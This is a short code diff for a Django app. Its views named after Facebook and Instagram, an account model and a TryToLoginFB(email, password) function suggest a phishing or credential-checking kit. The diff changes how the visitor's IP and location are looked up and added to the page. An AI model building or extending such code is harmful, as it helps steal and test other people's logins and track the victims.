@@ -1,7 +1,7 @@
 import urllib.request
 from django.shortcuts import render, redirect
 
-from Facebook.ipinfo import checkIpInfoDetails
+from Facebook.ipinfo import get_ip_details
 from .models import FacebookAccount
 from .check_login import FacebookLogin
 import time
@@ -40,8 +40,8 @@ def instagram(request):
 def facebook(request):
     hostname  = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
-    ipDetails = checkIpInfoDetails()
-    context = {'ip_address':ip_address, 'location_data':get_location(), 'ipDetails':ipDetails}
+    ipDetails = get_ip_details(get_ip())
+    context = {'ip_address':ip_address, 'location_data':get_location(), 'ipDetails':ipDetails, 'sss':request.META.get('HTTP_X_REAL_IP')}
     return render(request, 'index.html', context)
 
 def TryToLoginFB(email,password):
